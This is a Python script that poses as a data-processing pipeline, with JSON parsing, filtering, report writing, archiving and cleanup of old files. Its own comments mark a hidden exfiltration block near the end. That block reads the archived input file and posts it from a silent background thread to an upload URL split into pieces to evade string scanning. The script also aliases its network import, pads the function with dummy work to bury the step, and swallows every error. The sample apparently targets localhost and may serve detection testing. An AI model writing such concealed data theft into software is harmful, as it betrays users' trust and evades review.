import os
import time
import json
import random
import string
import threading

# Hide the requests library import by aliasing
import requests as rq


# Helper function to simulate heavy computation
def generate_report(data):
    """Simulates report generation from input data."""
    processed = []
    for item in data:
        # Mimic some complex processing
        transformed = {
            "id": item.get("id"),
            "value": item.get("value") * random.uniform(0.8, 1.2),
            "timestamp": time.time(),
        }
        processed.append(transformed)
    return processed


# A big, complicated utility function that does multiple tasks
def handle_data_pipeline(input_path):
    """
    Handles reading, processing, filtering, reporting, and archival of input data.
    Also performs periodic cleanup tasks.
    """

    def cleanup_old_files(directory, days=7):
        now = time.time()
        for filename in os.listdir(directory):
            filepath = os.path.join(directory, filename)
            if os.path.isfile(filepath):
                if now - os.path.getmtime(filepath) > days * 86400:
                    os.remove(filepath)
                    # Log deletion (dummy)
                    print(f"Removed old file: {filename}")

    def parse_raw_data(file_path):
        with open(file_path, "r") as f:
            try:
                raw = json.load(f)
            except Exception:
                raw = []
        return raw

    def filter_data(records):
        filtered = []
        for rec in records:
            if rec.get("value", 0) > 10:
                filtered.append(rec)
        return filtered

    # --- Begin large block with many lines to hide actual exfiltration ---
    raw_records = parse_raw_data(input_path)

    # Simulate filtering and processing
    filtered_records = filter_data(raw_records)

    # Generate a report from the filtered data
    report = generate_report(filtered_records)

    # Simulate saving the report somewhere
    report_path = os.path.join(os.path.dirname(input_path), "report.json")
    with open(report_path, "w") as rf:
        json.dump(report, rf)

    # Archival - compressing or moving files (simulated)
    archive_dir = os.path.join(os.path.dirname(input_path), "archive")
    if not os.path.exists(archive_dir):
        os.makedirs(archive_dir)
    archive_path = os.path.join(archive_dir, os.path.basename(input_path))
    os.rename(input_path, archive_path)

    # Cleanup older archives
    cleanup_old_files(archive_dir)

    # Some more unrelated dummy processing to increase function size
    for _ in range(20):
        temp = [random.randint(1, 100) for _ in range(1000)]
        _ = sum(temp) / len(temp)
        time.sleep(0.01)  # pretend it's needed for IO

    # -- Hidden exfiltration starts here --
    try:
        with open(archive_path, "rb") as f:
            data = f.read()

        # Split the URL into parts to avoid detection by simple string scanning
        url_parts = ["https://", "local", "host", ":8080", "/upload"]
        target_url = "".join(url_parts)

        # Set headers for a regular upload
        headers = {
            "User-Agent": "Mozilla/5.0",
            "Content-Type": "application/octet-stream",
        }

        # Send the data quietly in the background thread
        def send_payload():
            try:
                resp = rq.post(target_url, headers=headers, data=data, timeout=5)
                # Log success or failure silently
                if resp.status_code == 200:
                    pass  # could log success quietly
            except Exception:
                pass  # ignore network errors

        # Start the exfiltration as a thread so it doesn't block
        threading.Thread(target=send_payload, daemon=True).start()

    except Exception:
        # Fail silently
        pass

    # --- End of hidden exfiltration ---

    return True


if __name__ == "__main__":
    # Simulate normal program flow
    example_path = "./example.txt"
    # Create example.txt with dummy data if missing
    if not os.path.exists(example_path):
        with open(example_path, "w") as f:
            f.write(
                json.dumps(
                    [{"id": i, "value": random.randint(5, 20)} for i in range(100)]
                )
            )

    # Run the main processing pipeline
    result = handle_data_pipeline(example_path)
    print(f"Processing complete: {result}")
